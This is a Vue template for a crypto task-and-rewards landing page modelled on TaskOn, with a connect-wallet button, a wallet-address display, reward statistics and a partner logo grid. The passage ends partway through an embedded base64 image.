<template>
	<div data-v-app="" id="homeWrap">
		<div data-v-47230e1c="" class="app">
			<template data-v-47230e1c=""></template>
			<header data-v-638f5b6a="" class="mobile-header" style="">
				<div data-v-638f5b6a="" class="first-header hidden" style="display: none">
					<div data-v-638f5b6a="" class="g-safe-area first-header__container">

						<div data-v-638f5b6a="" class="l-switch">
							<div data-v-19a0181c="" data-v-638f5b6a="" class="the-switch">
								<a data-v-19a0181c="" class="out-link g-clickable the-switch__item active"
									href="https://taskon.xyz/user-landing" target="_self"
									rel="noopener noreferrer nofollow">Campaign</a><a data-v-19a0181c=""
									class="out-link g-clickable the-switch__item" href="https://taskon.xyz/cmuser/discover" target="_self"
									rel="noopener noreferrer nofollow">Community Hub</a>
							</div>
						</div>
					</div>
				</div>
				<header data-v-5b58baa3="" data-v-638f5b6a="" class="mobile__header">
					<div data-v-d945d197="" class="landing-header">
						<div class="connect_button" v-if="!walletObj.address">
							<button @click="showClt()" >链接钱包</button>
					</div>
					<div class="userislogin" v-else>
							<div class="erctrc_login">
									<div class="address_cl">
											{{ellipsisAddress(walletObj.address)}}
											<img v-if="userinfo.type === 'ERC'" src="https://huobicfg.s3.amazonaws.com/currency_icon/eth.png">
											<img v-if="userinfo.type === 'TRC'" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiB2aWV3Qm94PSIwIDAgMjQgMjQiPjxwYXRoIGZpbGw9IiNlMTFkNDgiIGQ9Ik0xMiAyQTEwIDEwIDAgMSAxIDIgMTJBMTAgMTAgMCAwIDEgMTIgMk02LjY4OCA2LjUzNmw0Ljc0NiAxMS45NDVsNi42MTUtOC4wNTlMMTUuNzA3IDguMlpNMTYuODQ1IDEwLjlsLTQuNzk0IDUuODRsLjYxNS01LjA4M3pNNy45MiA3LjkzbDQuMTQ2IDMuNDM5bC0uNjQ5IDUuMzYybC0zLjUtOC44em03LjY0MyAxbDEuMzggMS4zMTJsLTMuNzc0LjY4M3pNOC4zNzEgNy40ODZsNi41IDEuMmwtMi41MjQgMi4xeiIvPjwvc3ZnPg==">
									</div>
							</div>
							<div class="userinfoid">
									<span>UID:{{userinfo.uid}}</span>
							</div>
					</div>
						<div data-v-f970ec42="" data-v-d945d197="" role="button" tabindex="0" class="g-fix-outline g-pointer" @click="chageShowMenu(true)">
							<img data-v-d945d197="" class="menu-icon-open"
								src="data:image/svg+xml,%3csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20width=&#39;40&#39;%20height=&#39;24&#39;%20viewBox=&#39;0%200%2040%2024&#39;%20fill=&#39;none&#39;%3e%3cpath%20d=&#39;M2%2022H38M2%2012H38M2%202H38&#39;%20stroke=&#39;white&#39;%20stroke-opacity=&#39;0.8&#39;%20stroke-width=&#39;3&#39;%20stroke-linecap=&#39;round&#39;%20stroke-linejoin=&#39;round&#39;/%3e%3c/svg%3e"
								alt="" />
						</div>
					</div>
					<!---->
				</header>
				<div data-v-638f5b6a="" id="g-header-after"><!----></div>
			</header>
			<div data-v-05115bf9="" class="home-page__wrapper">
				<div data-v-dbe112eb="" data-v-05115bf9="" class="slogan-bn__content">
					<div data-v-dbe112eb="" class="g-safe-area slogan-bn__wrap">
						<div data-v-dbe112eb="" class="aside-info">
							<h2 data-v-dbe112eb="" class="main-title tracking-in-expand-fwd-top">
								Together Empowering Web3
							</h2>
							<div data-v-dbe112eb="" class="main-title__desc tracking-in-expand-fwd-bottom main-title__desc_wrap">
								Believe in the power of
								<span data-v-dbe112eb="" class="main-span">decentralized</span>
								collaboration. We
								<span data-v-dbe112eb="" class="sub-span">Grow</span> Together
								and <span data-v-dbe112eb="" class="sub-span">beyond</span> the
								next level.
							</div>
						</div>
					</div>
				</div>
				<div data-v-05115bf9="" class="g-safe-area">
					<div data-v-02002175="" data-v-05115bf9="" class="project-introduction">
						<div data-v-b50b0d32="" data-v-02002175="" class="introduction-wrap slide-in-left">
							<div data-v-b50b0d32="" class="introduction-tag">
								<div data-v-b50b0d32="" class="intro-tag">For Users</div>
							</div>
							<div data-v-b50b0d32="" class="introduction-title">
								Unlock Earnings &amp; Discover Alpha
							</div>
							<div data-v-b50b0d32="" class="introduction-data">
								<div data-v-b50b0d32="" class="introduction-data__item">
									<div data-v-b50b0d32="" class="count">
										<span data-v-b50b0d32="">$</span>3.9M+
									</div>
									<div data-v-b50b0d32="" class="count-label">
										TOKEN REWARDS
									</div>
								</div>
								<div data-v-b50b0d32="" class="introduction-data__item">
									<div data-v-b50b0d32="" class="count">8.5M+</div>
									<div data-v-b50b0d32="" class="count-label">
										NFT &amp; WHITELIST REWARDS
									</div>
								</div>
								<div data-v-b50b0d32="" class="introduction-data__item">
									<div data-v-b50b0d32="" class="count">57K+</div>
									<div data-v-b50b0d32="" class="count-label">CAMPAIGNS</div>
								</div>
							</div>
							<div data-v-b50b0d32="" class="introduction-content">
								<div data-v-b50b0d32="" class="introduction-content__item">
									<div data-v-b50b0d32="" class="content-label">LEARN</div>
									<div data-v-b50b0d32="" class="content-img">
										<img data-v-b50b0d32="" src="../assets/static/hs/learn_landing_png-DpKBHKQn.webp" alt="" />
									</div>
								</div>
								<div data-v-b50b0d32="" class="introduction-content__item">
									<div data-v-b50b0d32="" class="content-label">ENGAGE</div>
									<div data-v-b50b0d32="" class="content-img">
										<img data-v-b50b0d32="" src="../assets/static/hs/engage_landing_png-DBceBlIo.webp" alt="" />
									</div>
								</div>
								<div data-v-b50b0d32="" class="introduction-content__item">
									<div data-v-b50b0d32="" class="content-label">EARN</div>
									<div data-v-b50b0d32="" class="content-img">
										<img data-v-b50b0d32="" src="../assets/static/hs/earn_langding_png-C6gEO5LT.webp" alt="" />
									</div>
								</div>
							</div>
							<div data-v-b50b0d32="" class="introduction-btn">
								<a data-v-1b96f087="" data-v-b50b0d32="" href="https://taskon.xyz/user-landing" target="_blank"
									rel="no referer, no opener" type="button" class="g-button g-button--colored g-button--default"
									aria-label="" disabled="false">Start Earning Now
									<img data-v-b50b0d32=""
										src="data:image/svg+xml,%3csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20width=&#39;17&#39;%20height=&#39;10&#39;%20viewBox=&#39;0%200%2017%2010&#39;%20fill=&#39;none&#39;%3e%3cpath%20fill-rule=&#39;evenodd&#39;%20clip-rule=&#39;evenodd&#39;%20d=&#39;M12.2071%200.292893C11.8166%20-0.0976311%2011.1834%20-0.0976311%2010.7929%200.292893C10.4024%200.683417%2010.4024%201.31658%2010.7929%201.70711L13.0858%204H1.5C0.947715%204%200.5%204.44772%200.5%205C0.5%205.55228%200.947715%206%201.5%206H13.0858L10.7929%208.29289C10.4024%208.68342%2010.4024%209.31658%2010.7929%209.70711C11.1834%2010.0976%2011.8166%2010.0976%2012.2071%209.70711L16.2071%205.70711C16.2121%205.70208%2016.2171%205.697%2016.222%205.69188C16.3942%205.51224%2016.5%205.26848%2016.5%205&#39;%20fill=&#39;black&#39;/%3e%3c/svg%3e"
										alt="" /></a>
							</div>
						</div>
						<div data-v-10689001="" data-v-02002175="" class="introduction-wrap slide-in-right">
							<div data-v-10689001="" class="introduction-tag">
								<div data-v-10689001="" class="intro-tag">For Communities</div>
							</div>
							<div data-v-10689001="" class="introduction-title">
								Engage Your Community &amp;
								<span data-v-10689001="" class="second-span">Drive Growth</span>
								&amp;
								<span data-v-10689001="" class="second-span">Succeed</span>
							</div>
							<div data-v-10689001="" class="introduction-data">
								<div data-v-10689001="" class="introduction-data__item">
									<div data-v-10689001="" class="count">4M+</div>
									<div data-v-10689001="" class="count-label">ACTIVE USERS</div>
								</div>
								<div data-v-10689001="" class="introduction-data__item">
									<div data-v-10689001="" class="count">141M+</div>
									<div data-v-10689001="" class="count-label">
										TASKS COMPLETED
									</div>
								</div>
								<div data-v-10689001="" class="introduction-data__item">
									<div data-v-10689001="" class="count">3K+</div>
									<div data-v-10689001="" class="count-label">COMMUNITYS</div>
								</div>
							</div>
							<div data-v-10689001="" class="introduction-content">
								<img data-v-10689001="" src="../assets/static/hs/landing_projects-Cx3mo70N.webp" alt="" />
							</div>
							<div data-v-10689001="" class="introduction-btn">
								<a data-v-1b96f087="" data-v-10689001="" href="https://taskon.xyz/business-portal" target="_blank"
									rel="no referer, no opener" type="button" class="g-button g-button--confirm g-button--default"
									aria-label="" disabled="false">Super Charge Your Community Now
									<img data-v-10689001=""
										src="data:image/svg+xml,%3csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20width=&#39;17&#39;%20height=&#39;10&#39;%20viewBox=&#39;0%200%2017%2010&#39;%20fill=&#39;none&#39;%3e%3cpath%20fill-rule=&#39;evenodd&#39;%20clip-rule=&#39;evenodd&#39;%20d=&#39;M12.2071%200.292893C11.8166%20-0.0976311%2011.1834%20-0.0976311%2010.7929%200.292893C10.4024%200.683417%2010.4024%201.31658%2010.7929%201.70711L13.0858%204H1.5C0.947715%204%200.5%204.44772%200.5%205C0.5%205.55228%200.947715%206%201.5%206H13.0858L10.7929%208.29289C10.4024%208.68342%2010.4024%209.31658%2010.7929%209.70711C11.1834%2010.0976%2011.8166%2010.0976%2012.2071%209.70711L16.2071%205.70711C16.2121%205.70208%2016.2171%205.697%2016.222%205.69188C16.3942%205.51224%2016.5%205.26848%2016.5%205&#39;%20fill=&#39;black&#39;/%3e%3c/svg%3e"
										alt="" /></a>
							</div>
						</div>
					</div>
					<div data-v-4ffaa0cf="" data-v-05115bf9="" class="partner-wrap fade-in-bottom">
						<div data-v-4ffaa0cf="" class="sub-title">Our Key Value</div>
						<div data-v-4ffaa0cf="" class="img-box">
							<img data-v-4ffaa0cf="" class="incoming-img" src="../assets/static/hs/trust_imcoming-B_W_Zms4.svg"
								alt="" />
						</div>
					</div>
					<div data-v-e949c7c2="" data-v-05115bf9="" class="partner-wrap fade-in-bottom">
						<div data-v-e949c7c2="" class="sub-title">Our Partners</div>
						<div data-v-e949c7c2="" class="partner-list">
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap" src="../assets/static/hs/consensysscale-CSr1JTJ5.webp"
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">Consensys Scale</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap"
									src="data:image/webp;base64,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"
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">1inch</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap" src="../assets/static/hs/Bitkeep-Ci7GXPal.webp" alt="" />
								<div data-v-e949c7c2="" class="pn_name">Bitget Wallet</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap" src="../assets/static/hs/Bitlayerlabs-9OIEdzqK.webp"
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">Bitlayerlabs</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap" src="../assets/static/hs/Cookie3-Bcu_Z1vb.webp" alt="" />
								<div data-v-e949c7c2="" class="pn_name">Cookie3</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap"
									src="data:image/webp;base64,UklGRvACAABXRUJQVlA4TOMCAAAvX8AXEAehoG0jJzf4U3ia+0Nj/hW0bcN4B8D4c51qkG2kP4LvG7y/5AXMeCY+PoAAQdUJ9hMQFEgQQYMBQADw5ABoCyH0X3oBZMm22zYSRcs5m4IoKrX3v8xxk3ggMPknov+OJMltm8HFCbVQICisf+D+smIKMXjD+BA/8bb6ornGLOhokkMfS0GLPZEucvH21kSQ+PJ2RE7FLItJC0U8aGNjpTFhTaN5Ry6eLX8WT6ZEQuuc25EZjYk9gH6fFbSyH3Y6SRteZB0KNaU7oKHRhNisxNTFa1BtjQMrQi1XmrbG1AEiUKRL5OLltZrQZeAqlGmorIWRKWv2ykmLUKQ5AaXv+RdT1SbUrwN0t9GsleT5JnQbuIOGS0+Bb1UDxgw0IeagX9mpzEqXangI4rJ22N1G7fdjADRW7qQ8IEQiMxXXX7rkm45EI0gJiRNh11+6gxpUja7FOmAYoQt9YltVHc5MNSURLvaYxnCpwsRsPchtwCZROWmpjA/A+uPWW65Rm4IIv/7wvaE/qeAzkZ2TxZolJQUuoAiqEVqnwKfeZ3I1Yux2zmmRqj1j2mcKo2k2P3QnC4h2K2vwG4YqdR5CjAH0XG3k844+0kccC8imKRtIZjXTzDEaZ/mPytubJpu/7LLJ5y+zuLTm5ptBgPlLzm2oCjZ/seAT9FJ/LsPG4EXg6jRv6VwpG3g7XwC305YacyU48D7zahBCYp4GqiAaeOnIQi3soAaZLyHyHWgp0q8Ct+oGse15txPTmAtcBoGDSknFZkv0YckILeigSofFxLudvEYO7WAHFRsWqxp56zfKJ+aAuFXCGFah25nS53OZdQ2GmpEHWdd1oq3kdjYnqXXt6mrMla1rpSSxg+qqR3rybmfphX+JrGvNpEXyd4pWrPyLz4czX8zWMaGtMYNNSPVFF2VxY60dfQ2piJ4GSs9advoaiIilGEnchKxpUOsMRrrg3d+SBtCE7CV1MYzuryocAA=="
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">Core</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap"
									src="data:image/webp;base64,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"
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">Lista</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap" src="../assets/static/hs/manta-DyxF2VGo.webp" alt="" />
								<div data-v-e949c7c2="" class="pn_name">Manta</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap"
									src="data:image/webp;base64,UklGRgQIAABXRUJQVlA4TPcHAAAvY8AXELWC4rZtHGn/tVOu3zciJoCy/KoxlmtdUFoojAkBHEoAAbQGO259x11Tmq3tTRt96TgYIYqxIHX/K5rtWEEYwzf/dayUzyU9fJPxgYPitpGU9F/pPXH3YAmCJLlxm/n/a30lwgJYrEPa2sNmCEUIQhGCUIP9BotJY9AaZAZBCMKPEITrwG0kRUrtcO/xDfYLaE/bZ0iyuqrXtm3btnVs69a2bRt3tm1d2rqyrc6NqM5f9pw/4Yzil6tvdip+vznRm3M6ov8MHLdtcwa6hzrSAH2CbUj3/XWoXTWVbTOdOzk9xNs18cuJeZ9nnBTiKMNEABsgASbAALgBGkAFOAA+aOTUqsikn2wrU2nBX56fDkAtASyAByAACoaafKrNt2YmbSbt4yyDVhLAbLtC7a1qa6olfXTGeRwADegZ4GqN+86RTzUlnXNpmTTx1kkFNSSABIh2yKd+xaydL1Fbgm/HFUREeDPXvWo+lM7FZ5Qs8Gbue5ViPSOf8pbt5vmhFrQHKA1y1ev7z7nwmXEX1srfq/7cxRSnlvjfqDV9NdMf3LcqxVC+uUzamloUQDZhddX7vOq1O5fq0GatXgDn6o9RDMmnuFdqXQDfFbmev1+xSufEM0IggLZaKNajWOUh4L623dvbKyHRY/1HK4bYfEgqg9AI4KzbqRRLWSxx2W4nFXgA2PWe9LfYyq1TS9aESAB5qMPVeG7nnP+NUOmrBlezwjkn7yBDWB9AXYrSTiVtO9O2LoPXplj1LMJc2sSN0AlgLOGqV/xXU/rwLkIogFpNPpRqyEu/xghAVqLWRN/XSdH1ZWopNWucvB3+gpSIK9LPz3KKuTk7vubSXCZNnkElIX6QuWg4N9/imeEFYJZQvcp2u02lEWKVjGc60fe9eAMz/IBedPBZBhHu4lPPfaKNCHVRl2fadrsP3ACEtTOdJz1jGDw/uAF4FqRn1jAkZ5xm4ObHSjgG5vgMKhOBQSNYFQMMZwkA0FgCsaOIAHAkyVrZ7ChGQ3q3asS3KpjiGMIQIYnZDELR62GhhwMQGEIv0wGgxm9b/NfXl+9W8ZkJRW+W8w4JByuzRaw04rhi1/0NrihCWmb8t2u8OAbxwONOcNTxC9Dx+BPLD24PYFIIYW9gfnmQbbN5sWxzQvnxSzg+MJQfOwHAduHE0BGzjzoy3TqDuMEeR6dHjAfbAHrydmjOM8i4qtYaWHM5hZ7H/wP+s2GJ043HMxGuTtLcXGElbPqQGqznis89/APt4ugeozqSi2tVH4kgLT8wwJ50BuCfvJ2ait5lgxr18B5QTUwA9PNE9jRv/LNSkCbC54D/5YhsuNtyvg2l973xG4QAWLE7Y1svL+LCfxt4wFNIiJxm/kZ9VGbqvxou91DIa/Ge2ejIfKjYdmvgHOC3N994Hb8Ywn+91YiROPF1vHZD2QH49z8HfWHI4I0jn3j7D9i+mAWAHdnSYrcPe7ZrW6x3zOhP335Tf2zbYrFVpuwzAI66z1Ooqav7dHyHBLx5gEwtRz9owcwPu6gqUmbmMvP54Q+fwVbWT/2ZiDCh9bd5APqPSFuHQzWstV1LpVaPODbxP5ZKPxzbslRqbrulXXVSceXDDl9WvYTc3+XUHz9v2BBG1NbWNoyo0HZr4B78/PILz7/4FVVes+P0aVNP2bx53eWSV173alIPd6gsgi4O/Wf/lANdjBc2bZoz/66na55aFtNN5J/UScEDASh3DPJtPz41OdBzlpyHqn7WpZlr8EW/hifm/vaOdhmLtHofwF50N4CUtktzUlGJN75Q2x8eZXCaAfm+eFi6NnnQu0TV9//l2OThOCst33e3S4Ap3UO6fX2dFcw+LL/YAF7VMh5ARdL28/yzHF2jBlACquujUGHwZb8Qj3gvMYKLavRhFuv74gLwl3k9zBiGiwqzj59xrqPO2bAUNWmaHt8ZwFbpeefvg3jX